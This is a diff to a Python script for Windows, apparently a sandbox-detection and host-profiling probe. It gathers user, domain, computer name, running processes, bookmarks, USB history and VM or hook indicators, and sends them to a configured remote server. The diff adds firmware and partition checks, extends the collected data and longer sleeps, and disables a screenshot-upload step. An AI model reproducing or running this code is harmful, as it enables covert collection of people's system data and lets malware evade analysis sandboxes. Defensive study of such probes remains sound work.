@@ -21,6 +21,8 @@ import pythoncom
 from PIL import ImageGrab
 import requests
 from common_func import translateMessage, rec_split, randomword, readconfig
+from ctypes import WINFUNCTYPE, WinError, get_last_error, WinDLL, GetLastError, create_string_buffer
+from ctypes.wintypes import UINT, DWORD
 
 config = readconfig()
 #Global config
@@ -31,9 +33,28 @@ url_screenshot_end = config["url_screenshot_end"]
 subdomain = config["subdomain"]
 target_ip = config["target_ip"]
 
+#might be useful in the EFI test, now this is not used
+def errcheck(result, func, args):
+    if not result:
+        raise WinError(get_last_error())
+
 #Local config
 test_url = 'https://github.com/favicon.ico'
 test_hash = '4eda7c0f3a36181f483dd0a14efe9f58c8b29814'
+
+#test if legacy BIOS or EFI
+def efi_test():    
+    LPCTSTR = ctypes.c_char_p    
+    kernel32 = WinDLL('kernel32',use_last_error=False)
+    GetFirmware = kernel32.GetFirmwareEnvironmentVariableA
+    GetFirmware('',LPCTSTR('{00000000-0000-0000-0000-000000000000}'.encode('ascii')),None,0)
+    error = GetLastError()
+    if error == 1:    #ERROR_INVALID_FUNCTION
+        return 'legacy'
+    elif error == 998:
+        return 'EFI'
+    else:
+        return 'error_'+str(error)
 
 # get non-default bookmarks from IE
 def get_bookmarks():
@@ -51,6 +72,7 @@ def get_bookmarks():
           if filename not in known:
               matches = matches + "BKMRK " + filename + "|"
     return matches
+
 # get the number of files which have been recently opened (saved in registry)
 def get_recently_opened_files():
     pythoncom.CoInitialize()
@@ -76,6 +98,7 @@ def get_recently_opened_files():
             pass
         key.Close()
     return 'RRG ' + str(recentstuff) + '|'
+
 # get number of pendrives used in computer
 def get_pendrives():
     pythoncom.CoInitialize()
@@ -107,6 +130,7 @@ def get_pendrives():
                 skey.Close()
         return pendrives
 titles = ""
+
 # get applications with Windows GUI
 def enumwindows():
     EnumWindows = ctypes.windll.user32.EnumWindows
@@ -127,6 +151,7 @@ def enumwindows():
         return True
     EnumWindows(EnumWindowsProc(foreach_window), 0)
     return titles + "|"
+
 # check the VIDEOBIOSVERSION, known VM detection technique
 def get_videobios():
     pythoncom.CoInitialize()
@@ -152,6 +177,7 @@ def get_videobios():
     return videobios
 def hex2(n):
     return hex (n & 0xffffffff)[:-1]
+
 # check whether function is hooked
 def is_hooked(func):
     addr = addressof(func)
@@ -179,6 +205,7 @@ def test_network(url, hash):
             return False
     except:
         return False
+
 # check whether DNS is available
 def test_dns(domain, ip):
     try:
@@ -190,6 +217,7 @@ def test_dns(domain, ip):
             return False
     except:
         return False    
+
 # run the command in cmd shell    
 def run_command(cmd):
     out = ""
@@ -207,6 +235,7 @@ def run_command(cmd):
     except:
         pass
     return out
+
 # number of recently modified files 
 def num_of_recent_files(path, days):
     i = 0
@@ -219,6 +248,7 @@ def num_of_recent_files(path, days):
             except:
                 pass
     return i
+
 # is the local port open?
 def port_open(port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -230,6 +260,7 @@ def port_open(port):
         return False
 class POINT(Structure):
     _fields_ = [("x", c_ulong), ("y", c_ulong)]
+
 # get the current position of the mouse
 def queryMousePosition():
     pt = POINT()
@@ -253,6 +284,7 @@ def format_helper(commands):
         regex2 = re.compile(r"\s\|")
         result = regex2.sub("|", result2)
     return result
+
 # group of commands to run in thread
 def commands_1(result, target, key, host, network_avail, dns_avail):
     # python wmi was too sloooooow :/
@@ -280,10 +312,12 @@ def commands_1(result, target, key, host, network_avail, dns_avail):
                 'wmic desktopmonitor get caption':'MON',
                 'wmic systemenclosure get manufacturer':'SYE',
                 'wmic sounddev get caption':'SND',
-                'wmic process get executablepath':'EX'
+                'wmic process get executablepath':'EX',
+                'wmic partition where \'type = "GPT: System"\' get type':'GPT'
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
+
 
 def commands_3(result, target, key, host, network_avail, dns_avail):
     commands = {
@@ -294,8 +328,9 @@ def commands_3(result, target, key, host, network_avail, dns_avail):
                 }
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_4(result, target, key, host, network_avail, dns_avail):
-    commands = {#'wmic product get Name':'PN',      #disabled due to performance issues
+    commands = {'wmic product get Name':'PN',      #disabled due to performance issues
                 }
     for c, v in commands.iteritems():
         # print (c)
@@ -307,6 +342,7 @@ def commands_4(result, target, key, host, network_avail, dns_avail):
         regex2 = re.compile(r"\s\|")
         result = regex2.sub("|", result2)
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_5(result, target, key, host, network_avail, dns_avail):
     result = result + 'RINTEMP ' + str(num_of_recent_files(os.path.expandvars('%TEMP%'), 7)) + "|"
     result = result + 'RINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 7)) + "|"
@@ -315,12 +351,15 @@ def commands_5(result, target, key, host, network_avail, dns_avail):
     result = result + 'RINAPPD ' + str(num_of_recent_files(os.path.expandvars('%APPDATA%'), 7)) + "|"
     result = result + 'AINDESK ' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%') + '\\Desktop', 99999)) + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_6(result, target, key, host, network_avail, dns_avail):
     
     result = result + "WIDTH " + str(GetSystemMetrics (0)) + "|"
     result = result + "HEIGHT " + str(GetSystemMetrics (1)) + "|"
     result = result + "USER " + os.path.expandvars('%USERNAME%') + "|"
     result = result + "USERDOM " + os.path.expandvars('%USERDOMAIN%') + "|"
+    result = result + "LOGONS " + os.path.expandvars('%LOGONSERVER%') + "|"
+    result = result + "COMPN " + os.path.expandvars('%COMPUTERNAME%') + "|"
     # result =  result + 'aindoc-' + str(num_of_recent_files(os.path.expandvars('%USERPROFILE%')+ '\\Documents',99999))+ "|"
    
     mac = get_mac()
@@ -331,6 +370,7 @@ def commands_6(result, target, key, host, network_avail, dns_avail):
     result = result + 'EXEC ' + str(sys.argv[0].split(os.sep)[-1]) + "|"
     result = result + 'TIME ' + str(time.time()) + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_7(result, target, key, host, network_avail, dns_avail):
     # pokemon style error handling
     try:
@@ -350,27 +390,36 @@ def commands_7(result, target, key, host, network_avail, dns_avail):
     except:
         pass
     try:
-        result = result + 'SBIE ' + check_dll('sbiedll.dll')
+        result = result + 'SBIE ' + check_dll('sbiedll.dll') + "|"
+    except:
+        pass
+    try:
+        result = result + 'EFI ' + efi_test() + "|"
     except:
         pass
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_8(result, target, key, host, network_avail, dns_avail):
      result = result + 'LOCALPORT ' + str(port_open(445)) + "|"
      send_data(result, target, key, host, network_avail, dns_avail)
+
 def commands_9(result, target, key, host, network_avail, dns_avail):
     try:
         result = result + get_pendrives()
     except:
         pass
     send_data(result, target, key, host, network_avail, dns_avail)
+
 def mysleep():
-    time.sleep(5)
+    time.sleep(45)
+
 # check whether someone or something clicked on the messagebox
 def msgbox(target, key, host, network_avail, dns_avail):
     ctypes.windll.user32.MessageBoxA(0, "", "", 0)
     # we only arrive here if ok has been clicked
     result = 'OK ' + "ICANHAZCLICK" + "|"
     send_data(result, target, key, host, network_avail, dns_avail)
+
 # create a lot of computation in this thread while the other thread sleeps. Meanwhile measure mouse position
 def calc_hash():
     pos1 = queryMousePosition()
@@ -378,7 +427,8 @@ def calc_hash():
     global result
     hash_object = hashlib.sha1("x")
     # print(str(datetime.datetime.utcnow()))
-    for i in range(100000):
+    #for i in range(100000):
+    for i in range(1000000):    
         hash_object = hashlib.sha1(hash_object.hexdigest())
     # print(str(datetime.datetime.utcnow()))
     pos2 = queryMousePosition()
@@ -427,12 +477,16 @@ try:
     host = randomword(10)
     network_avail = test_network(test_url, test_hash)
     dns_avail = test_dns(target, target_ip)
-    #network_avail = True
-    #dns_avail = True
-    fl = [commands_1, #commands_2,
-          #commands_3,  #disabled
-          commands_4,    
-          commands_5,commands_6,commands_7,commands_8,commands_9]
+
+    fl = [commands_1, 
+          commands_3,  
+          #commands_4,    #runs very slow, enable if it has enough time/resources
+          commands_5,
+          commands_6,
+          commands_7,
+          commands_8,
+          commands_9
+          ]
     t = []
     for f in fl:
         try:
@@ -452,17 +506,23 @@ try:
         t1.join()
         t2.join()
         send_data(result, target, key, host, network_avail, dns_avail)
+        
+        #check if msgbox is clicked
         t3 = Thread(target=msgbox, args=(target, key, host, network_avail, dns_avail))
         t3.start()
     except:
         pass
+    
     # send a desktop screenshot if direct http connection is available
     try:
         if network_avail:
-            ImageGrab.grab().save(host + ".png", "PNG")
-            url = 'http://' + target + url_screenshot_end + "?h=" + host
-            files = {host + '.png': open(host + '.png', 'rb')}
-            r = requests.post(url, files=files)
+            grab_screenshot = False
+            
+            if grab_screenshot:
+                ImageGrab.grab().save(host + ".png", "PNG")
+                url = 'http://' + target + url_screenshot_end + "?h=" + host
+                files = {host + '.png': open(host + '.png', 'rb')}
+                r = requests.post(url, files=files)
     except:
         pass
 
@@ -471,6 +531,5 @@ try:
         x.join()
     
 except:
-    # print("e")
     #traceback.print_exc()
     pass
